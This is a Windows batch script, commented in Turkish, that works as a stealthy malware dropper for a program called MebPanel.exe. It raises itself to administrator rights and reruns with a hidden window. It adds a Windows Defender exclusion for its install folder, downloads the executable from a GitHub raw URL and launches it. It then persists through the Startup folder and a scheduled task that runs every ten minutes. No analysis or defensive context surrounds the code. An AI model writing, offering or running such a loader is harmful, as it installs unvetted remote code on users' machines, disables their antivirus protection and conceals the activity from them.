@echo off
:: Yönetici kontrolü
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)
:: Gizli mod
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)
:: Ayarlar
set "INSTALL=%APPDATA%\MebPanel"
set "URL=https://raw.githubusercontent.com/zugar00311/aa/refs/heads/main/MebPanel.exe"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "BATFILE=%STARTUP%\MebPanel_Kontrol.bat"
set "EXEFILE=%INSTALL%\MebPanel.exe"
:: Klasör oluþtur
mkdir "%INSTALL%" 2>nul
:: Defender dýþlama
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%INSTALL%'" >nul 2>&1
:: Kontrol: MebPanel.exe var mý?
if not exist "%EXEFILE%" (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%EXEFILE%' -UseBasicParsing" >nul 2>&1
)
:: Çalýþýyor mu kontrol et
tasklist | findstr /I "MebPanel.exe" >nul
if %ERRORLEVEL% NEQ 0 (
    start "" "%EXEFILE%"
)
:: Baþlangýca ekle
if not exist "%BATFILE%" (
    copy "%~f0" "%BATFILE%" >nul 2>&1
)
:: Görev Zamanlayýcý - Her 10 dakikada bir
schtasks /query /tn "MebPanelChecker" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    schtasks /create /tn "MebPanelChecker" /tr "'%BATFILE%'" /sc minute /mo 10 /f >nul 2>&1
)
exit